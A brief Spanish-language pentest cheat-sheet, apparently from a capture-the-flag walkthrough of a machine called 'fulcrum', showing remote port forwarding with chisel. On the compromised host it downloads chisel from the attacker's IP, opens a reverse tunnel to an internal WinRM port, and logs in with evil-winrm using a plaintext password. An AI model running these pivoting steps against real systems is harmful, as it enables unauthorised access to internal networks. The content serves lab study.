
### RPF -- REMOTE PORT FORWARDING
```shell
#INSTALAR CHISEL MAQUINA LOCAL.
❯ wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
❯ mv chisel_1.10.1_linux_amd64.gz chisel.gz
❯ gunzip chisel.gz
❯ chmod +x chisel

#TRANSFERIR CHISEL
www-data@fulcrum:/tmp$ wget http://10.10.16.5/chisel
www-data@fulcrum:/tmp$ chmod +x chisel


#MÁQUINA LOCAL
❯ sudo ./chisel server --reverse -p 2222

#MÁQUINA VICTIMA
www-data@fulcrum:/tmp$ ./chisel client 10.10.16.5:2222 R:5985:192.168.122.228:5985


#EN CASO DE QUE USEMOS EVIL-WINRM
❯ evil-winrm -i 127.0.0.1 -u 'webuser' -p 'M4ng£m£ntPa55'
```